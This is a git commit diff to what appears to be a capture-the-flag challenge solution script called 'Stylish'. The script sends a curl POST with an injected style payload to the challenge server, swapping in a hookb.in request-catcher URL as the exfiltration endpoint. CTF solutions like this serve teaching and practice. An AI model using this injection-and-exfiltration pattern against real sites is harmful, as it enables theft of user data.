d04dcb8848e3c16c8bc5a6c9acb9de1f77703680
Anthony Li <me@anli.dev>
2021-06-12 15:30:32 -0400

    Add a hint to Stylish

--- stylish/solution.bash
+++ stylish/solution.bash
@@ -1,3 +1,3 @@
 #! /usr/bin/env bash
 
-curl --data-urlencode "bg=white" --data-urlencode "fg=black" --data-urlencode "bbg=black" --data-urlencode "bfg=$(cat solution.txt | sed 's;YOUR_URL_HERE;https://hookb.in/r1YPR13mqrtzWWJVyDa7;g')" -X POST http://localhost:1337/submit
+curl --data-urlencode "bg=white" --data-urlencode "fg=black" --data-urlencode "bbg=black" --data-urlencode "bfg=$(cat solution.txt | sed 's;YOUR_URL_HERE;https://hookb.in/XkM7qXxEQDuGBBm38r6o;g')" -X POST http://webp.bcactf.com:49153/submit
